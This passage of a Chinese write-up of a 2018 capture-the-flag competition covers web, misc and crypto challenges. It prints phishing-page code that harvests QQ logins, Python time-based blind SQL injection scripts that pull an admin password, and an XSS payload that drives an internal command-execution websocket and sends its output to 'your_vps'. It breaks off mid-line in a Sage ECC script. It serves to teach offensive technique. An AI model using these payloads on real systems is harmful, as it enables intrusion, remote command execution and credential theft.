<p>不难看出，作者自己写了rc4算法和base64加解密<br>而密文流程为：<br>base64解密-&gt;rc4解密-&gt;url解码<br>我这里直接选择控制台解密<br>利用console.log和出题人定义好的解密函数，容易直接得到明文代码,由于代码篇幅过长，想看这部分伪造钓鱼代码的，可以看之前文章提及的先知上的一篇文章，我这里只给出部分重要js代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">      <span class="keyword">var</span> key = <span class="string">"MiaoMiao"</span>;</span><br><span class="line">      <span class="keyword">var</span> times = <span class="number">0</span>;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">error</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">        $(<span class="string">"#error_tips"</span>).css(&#123;</span><br><span class="line">          display: <span class="string">'block'</span></span><br><span class="line">        &#125;);</span><br><span class="line">        $(<span class="string">'#error_message'</span>).html(msg);</span><br><span class="line">        err = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      $(<span class="string">'form input'</span>).focus(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="string">"#error_tips"</span>).css(&#123;</span><br><span class="line">          display: <span class="string">'none'</span></span><br><span class="line">        &#125;);</span><br><span class="line">        err = <span class="literal">false</span>;</span><br><span class="line">      &#125;);</span><br><span class="line">      $(<span class="string">"#error_tips"</span>).on(<span class="string">'click'</span>,</span><br><span class="line">      <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="keyword">this</span>).hide();</span><br><span class="line">      &#125;);</span><br><span class="line">      $(<span class="string">"#go"</span>).on(<span class="string">'click'</span>,</span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $<span class="keyword">this</span> = $(<span class="keyword">this</span>);</span><br><span class="line">        err = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">var</span> p = $(<span class="string">"#p"</span>).val();</span><br><span class="line">        <span class="keyword">var</span> u = $(<span class="string">"#u"</span>).val();</span><br><span class="line">        u == <span class="string">''</span> &amp;&amp; error(<span class="string">'您还没有输入帐号！'</span>);</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        p == <span class="string">''</span> &amp;&amp; error(<span class="string">"您还没有输入密码！"</span>);</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        /^[<span class="number">1</span><span class="number">-9</span>][<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">5</span>,<span class="number">9</span>&#125;$/.test(u) || error(<span class="string">'请输入正确的帐号！'</span>);</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">var</span> len = p.length; (len &lt; <span class="number">6</span> || len &gt; <span class="number">16</span>) &amp;&amp; error(<span class="string">'您输入的帐号或密码不正确，请重新输入。'</span>);</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          $(<span class="string">"#p"</span>).val(<span class="string">''</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">if</span> (!err)&#123;</span><br><span class="line">			$.ajax(&#123;</span><br><span class="line">				url:<span class="string">'/f701fee85540b78d08cb276d14953d58'</span>,</span><br><span class="line">				type:<span class="string">'POST'</span>,</span><br><span class="line">				dataType:<span class="string">'json'</span>,</span><br><span class="line">				data: <span class="string">"data="</span>+<span class="built_in">encodeURIComponent</span>(encryptByDES($(<span class="string">'#loginform'</span>).serialize(),key)),</span><br><span class="line">				error:<span class="function"><span class="keyword">function</span>(<span class="params">er</span>)</span>&#123;</span><br><span class="line">				    <span class="built_in">window</span>.location.href=<span class="string">'https://qzone.qq.com'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">encryptByDES</span>(<span class="params">message, key</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> keyHex = CryptoJS.enc.Utf8.parse(key);</span><br><span class="line">            <span class="keyword">var</span> encrypted = CryptoJS.DES.encrypt(message, keyHex, &#123;</span><br><span class="line">                mode: CryptoJS.mode.ECB,</span><br><span class="line">                padding: CryptoJS.pad.Pkcs7</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="keyword">return</span> encrypted.ciphertext.toString(CryptoJS.enc.Base64);</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>我们不难看到，黑客获取到用户登录的账号密码后，进行了序列化，然后利用DES加密后post到了后端/f701fee85540b78d08cb276d14953d58<br>其中DES的密钥为MiaoMiao<br>现在容易得到思路：<br>由于该网站是一个钓鱼网站，那么势必会存储用户登录的账号密码<br>那么既然要存储，可能就会涉及Sql注入问题。既然是钓鱼网站的sql操作<br>我相信不会有太多的过滤吧(毕竟我相信钓鱼的人不会这么XD)<br>所以我的第一反应就是insert注入，测试后可以发现，无论post什么数据<br>网页均无反馈，看起来就是sleep盲注了<br>于是我构造出测试脚本(注：这里需要注意传输数据得用key加密)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">"http://45.76.49.10:8001/f701fee85540b78d08cb276d14953d58"</span></span><br><span class="line">payload =<span class="string">"1' and if((ascii(substr((database()),1,1))&gt;-1),sleep(10),1) or '"</span></span><br><span class="line">pay = <span class="string">"ip=0.0.0.0&amp;hrUW3PG7mp3RLd3dJu=12345678900&amp;LxMzAX2jog9Bpjs07jP=%s"</span>%payload</span><br><span class="line">k = des(<span class="string">"MiaoMiao"</span>, ECB, <span class="string">"\0\0\0\0\0\0\0\0"</span>, pad=<span class="keyword">None</span>, padmode=PAD_PKCS5)</span><br><span class="line">d = base64.b64encode(k.encrypt(pay))</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"data"</span>:d</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> pay</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s =requests.post(url=url,data=data,timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">print</span> s.content</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"sleep 10s ok!"</span></span><br></pre></td></tr></table></figure></p>
<p>发现可以成功sleep，于是我立刻写出了注入脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">"http://45.76.49.10:8001/f701fee85540b78d08cb276d14953d58"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'1234567890abcdef&#123;&#125;'</span>:</span><br><span class="line">        j = ord(j)</span><br><span class="line">        payload = <span class="string">"1' and if((ascii(substr((select password from admin limit 0,1),%s,1))=%s),sleep(3),1) or '"</span>%(i,j)</span><br><span class="line">        pay = <span class="string">"ip=0.0.0.0&amp;hrUW3PG7mp3RLd3dJu=%s&amp;LxMzAX2jog9Bpjs07jP=123456789"</span> % (payload)</span><br><span class="line">        k = des(<span class="string">"MiaoMiao"</span>, ECB, <span class="string">"\0\0\0\0\0\0\0\0"</span>, pad=<span class="keyword">None</span>, padmode=PAD_PKCS5)</span><br><span class="line">        d = base64.b64encode(k.encrypt(pay))</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"data"</span>: d</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s = requests.post(url=url, data=data,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p>最后可以得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;73ad1744f38b68ece51076c7ac77621b&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p><a href="http://117.34.112.247:8001" target="_blank" rel="noopener">http://117.34.112.247:8001</a><br>题目的背景为xss-&gt;rce<br>同时给出了部分代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">type msg struct &#123;</span><br><span class="line">	Cmd string `json:&quot;cmd&quot;`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    app := sweetygo.New(&quot;./&quot;, nil)</span><br><span class="line">    app.GET(&quot;/ws&quot;, ws)</span><br><span class="line">    app.RunServer(&quot;:8002&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func ws(ctx *sweetygo.Context) &#123;</span><br><span class="line">	conn, _ := websocket.Upgrade(ctx.Resp, ctx.Req, ctx.Resp.Header(), 1024, 1024)</span><br><span class="line">	for &#123;</span><br><span class="line">		m := msg&#123;&#125;</span><br><span class="line">		err := conn.ReadJSON(&amp;m)</span><br><span class="line">		if err != nil &#123;</span><br><span class="line">			fmt.Println(&quot;Error reading json.&quot;, err)</span><br><span class="line">			break</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		res := exec(m.Cmd)</span><br><span class="line">		fmt.Println(res)</span><br><span class="line">		if err = conn.WriteJSON(res); err != nil &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			break</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>不难看出作者使用了go web框架sweetygo<br>帮作者推广一波<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">github.com/AmyangXYZ/sweetygo</span><br></pre></td></tr></table></figure></p>
<p>这里看应该不存在漏洞的，然后就容易联想到醒目题目描述<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">“grollia的websocket真好用，一句话 conn, _ := websocket.Upgrade(ctx.Resp, ctx.Req, ctx.Resp.Header(), 1024, 1024)就建好了，我也可以搭个IGo NoteBook啦！”</span><br><span class="line">—— 刚学Golang的小明</span><br></pre></td></tr></table></figure></p>
<p>这里容易联想到websocket的问题<br>我们看到代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">func main() &#123;</span><br><span class="line">    app := sweetygo.New(&quot;./&quot;, nil)</span><br><span class="line">    app.GET(&quot;/ws&quot;, ws)</span><br><span class="line">    app.RunServer(&quot;:8002&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>首先探测了一下，发现8002端口并没有对外网开放<br>我们只能通过内部访问，而唯一的方式就是xss<br>而我们知道js可以连接websocket<br>同时注意到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">func ws(ctx *sweetygo.Context) &#123;</span><br><span class="line">	conn, _ := websocket.Upgrade(ctx.Resp, ctx.Req, ctx.Resp.Header(), 1024, 1024)</span><br><span class="line">	for &#123;</span><br><span class="line">		m := msg&#123;&#125;</span><br><span class="line">		err := conn.ReadJSON(&amp;m)</span><br><span class="line">		if err != nil &#123;</span><br><span class="line">			fmt.Println(&quot;Error reading json.&quot;, err)</span><br><span class="line">			break</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		res := exec(m.Cmd)</span><br><span class="line">		fmt.Println(res)</span><br><span class="line">		if err = conn.WriteJSON(res); err != nil &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			break</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里存在命令执行(但是出题人为了安全，只允许执行ls和cat)<br>可以看到，如果我们连接上websocket,传输msg即可造成rce<br>所以现在的思路比较清晰了<br>1.构造xss，利用js连接websocket<br>2.连接后发送RCE命令(ls)<br>3.将数据打出到自己的vps<br>查阅资料可以发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">onmessage:一个用于消息事件的事件监听器，这一事件当有消息到达的时候该事件会触发。这个Listener会被传入一个名为&quot;message&quot;的 MessageEvent 对象。</span><br><span class="line"></span><br><span class="line">onopen:一个用于连接打开事件的事件监听器。当readyState的值变为 OPEN 的时候会触发该事件。该事件表明这个连接已经准备好接受和发送数据。这个监听器会接受一个名为&quot;open&quot;的事件对象。</span><br></pre></td></tr></table></figure></p>
<p>我们先写出xss进行探测，看是否可以成功连接<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">"ws://127.0.0.1:8002/ws"</span>);</span><br><span class="line">ws.onopen = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$.ajax(&#123;</span><br><span class="line">		url: <span class="string">"http://your_vps/success"</span></span><br><span class="line">	&#125;);</span><br><span class="line">&#125;;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>不一会儿就发现收到了success数据，证明连接成功<br>于是我们构造出rce的js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">"ws://127.0.0.1:8002/ws"</span>);</span><br><span class="line">ws.onopen = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> b = &#123;<span class="string">"cmd"</span>:<span class="string">"ls"</span>&#125;;</span><br><span class="line">	ws.send(<span class="built_in">JSON</span>.stringify(b));</span><br><span class="line">&#125;;</span><br><span class="line">ws.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>)</span>&#123;</span><br><span class="line">	$.ajax(&#123;</span><br><span class="line">		url: <span class="string">"http://your_vps/?"</span>+evt.data</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>收到回显<br><img src="/images/2018shanxi (14).jpg"><br>读取flag<br><img src="/images/2018shanxi (15).jpg"><br>后来了解到此题的背景同样为真实案例：<br>IPython Notebook( CVE-2014-3429 )<br>膜一发作者~</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h3><p>题目打开后得到一个图片<br>发现ffd9后有压缩包<br><img src="/images/2018shanxi (16).jpg"><br>提取出来后发现是伪加密<br>利用binwalk直接提取<br>获得文件stego.txt<br><img src="/images/2018shanxi (17).jpg"><br>第一反应即base64隐写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.tr0y.wang/2017/06/14/Base64steg/</span><br></pre></td></tr></table></figure></p>
<p>随即写脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"></span><br><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'stego.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="string">''</span>.join(line.split())</span><br><span class="line">        rowb64 =  <span class="string">''</span>.join(stegb64.decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).split())</span><br><span class="line"></span><br><span class="line">        offset = abs(b64chars.index(stegb64.replace(<span class="string">'='</span>,<span class="string">''</span>)[<span class="number">-1</span>])-b64chars.index(rowb64.replace(<span class="string">'='</span>,<span class="string">''</span>)[<span class="number">-1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">'='</span>) <span class="comment">#no equalnum no offset</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += bin(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">''</span>.join([chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>)]) <span class="comment">#8位一组</span></span><br></pre></td></tr></table></figure></p>
<p>运行即可获得flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag&#123;Ba5e_64OFive&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p>这题做的我心态歇逼了<br>首先是题目描述<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我觉得，这题可以在windows环境下解。</span><br></pre></td></tr></table></figure></p>
<p>windows下解的mp3题<br>一般misc无非是隐写，windows下的隐写，容易想到ntfs<br>但是心态歇逼的第一点：<br>用其他压缩软件解压题目给的压缩包，都得不到ntfs隐写。。。<br>唯独winrar解压可以得到，用工具查看<br><img src="/images/2018shanxi (18).jpg"><br>发现有flag.doc文件<br>导出后查看文件内容<br>发现有处有奇怪的空白<br><img src="/images/2018shanxi (19).jpg"><br>我们改变一下字体颜色为红色<br><img src="/images/2018shanxi (20).jpg"><br>但是显然是第二段的flag：<code>_from_your_efforts}</code><br>还有一段在哪里呢？<br>这就是第二个歇逼的点。。。<br>用winhex或者改成txt格式查看文件末尾<br>可以发现<br><img src="/images/2018shanxi (21).jpg"><br>另一段flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f l a g &#123; A l l _ s u c c e s s _ c o m e s</span><br></pre></td></tr></table></figure></p>
<p>最后得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;All_success_comes_from_your_efforts&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h3><p>题目有些脑洞<br>看到题目提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ames发现公司员工通过数据包向外隐匿地发送信息，并截获了这段时间的流量包，请帮助他恢复流量中隐匿传输的信息，并以flag&#123;*&#125;的形式提交。</span><br></pre></td></tr></table></figure></p>
<p>重点在于隐匿的，查看了一遍tcp和http流量，并未发现什么奇特的点<br>最后在icmp协议中发现了问题<br><img src="/images/2018shanxi (22).jpg"><br><img src="/images/2018shanxi (23).jpg"><br><img src="/images/2018shanxi (24).jpg"><br>容易看到每个icmp协议中的2个字符都在变化，其余均不变，于是脑洞大开，拼接为一起，成功得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;RyHgbCf5OhFEiyJnlt9c8ASP&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="crypto1"><a href="#crypto1" class="headerlink" title="crypto1"></a>crypto1</h3><p>题目描述<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在RSA算法中，我们知道公钥加密指数e要与φ(n)互素。但是如果e与φ(n)不互素，我们应该怎么办呢？</span><br><span class="line">已知条件见文本，解出明文，递交FLAG。</span><br></pre></td></tr></table></figure></p>
<p>观察到e为200=8*25<br>此时我们可以用25的逆元去解，然后开8次方即可<br>脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c=<span class="number">7797067792814175554801975939092864905908878472965854967525218347636721153564161093453344819975650594936628697646242713415817737235328825333281389820202851500260665233910426103904874575463134970160306453553794787674331367563821223358610113031883172742577264334021835304931484604571485957116313097395143177603380107508691261081725629713443494783479897404175199621026515502716868988672289887933681890547568860707175288422275073767747544353536862473367590288531216644146154729962448906402712219657000812226637887827912541098992158458173920228864293993030475885461755767069329678218760943185942331149777258713727459739405</span></span><br><span class="line">p=<span class="number">111052706592359766492182549474994387389169491981939276489132990221393430874991652628482505832745103981784837665110819809096264457329836670397000634684595709283710756727662219358743235400779394350023790569023369287367240988429777113514012101219956479046699448481988253039282406274512111898037689623723478951613</span></span><br><span class="line">q=<span class="number">146182161315365079136034892629243958871460254472263352847680359868694597466935352294806409849433942550149005978761759458977642785950171998444382137410141550212657953776734166481126376675282041461924529145282451064083351825934453414726557476469773468589060088164379979035597652907191236468744400214917268039573</span></span><br><span class="line">e=<span class="number">25</span></span><br><span class="line">n=p*q</span><br><span class="line">d =gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">flag8 = pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span> hex(gmpy2.iroot(flag8,<span class="number">8</span>)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure></p>
<p>即可得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x4354467b4c6966655f49535f415f4265617574797d</span><br></pre></td></tr></table></figure></p>
<p>即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;Life_IS_A_Beauty&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="crypto2"><a href="#crypto2" class="headerlink" title="crypto2"></a>crypto2</h3><p>题目实际上ecc算法<br>参考链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hgarrereyn.gitbooks.io/th3g3ntl3man-ctf-writeups/2017/picoCTF_2017/problems/cryptography/ECC2/ECC2.html</span><br></pre></td></tr></table></figure></p>
<p>使用上述链接中的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from sage.all import *</span><br><span class="line"></span><br><span class="line">M = 93556643250795678718734474880013829509320385402690660619699653921022012489089</span><br><span class="line">A = 66001598144012865876674115570268990806314506711104521036747533612798434904785</span><br><span class="line">B = 25255205054024371783896605039267101837972419055969636393425590261926131199030</span><br><span class="line">P = (56027910981442853390816693056740903416379421186644480759538594137486160388926, 65533262933617146434438829354623658858649726233622196512439589744498050226926)</span><br><span class="line">Q = (82470715998045253133931379369477906093551619202698188387811754055611146940802, 73706972132070004469528192666337156782673206740372495041722107956327401385152)</span><br><span class="line">F = FiniteField(M)</span><br><span class="line">E = EllipticCurve(F,[A,B])</span><br><span class="line">P = E.point(P)</span><br><span class="line">Q = E.point(Q)</span><br><span class="line">factors, exponents = zip(*factor(E.order()))</span><br><span class="line">primes = [factors[i] ^ exponents[i] for i in range(len(factors))][:-2]</span><br><span class="line">dlogs = []</span><br><span class="line">for fac in primes:</span><br><span class="line">    t = int(P.order()) / int(fac)</span><br><span class="line">    dlog = discrete_log(t*Q,t*P,operation=&quot;+&quot;)</span><br><span class="line">    dlogs += [dlog]</span><br><span class="line">    print(&quot;factor: &quot;+str(fac)+&quot;, Discrete Log: &quot;+str(dlog)) #calculates 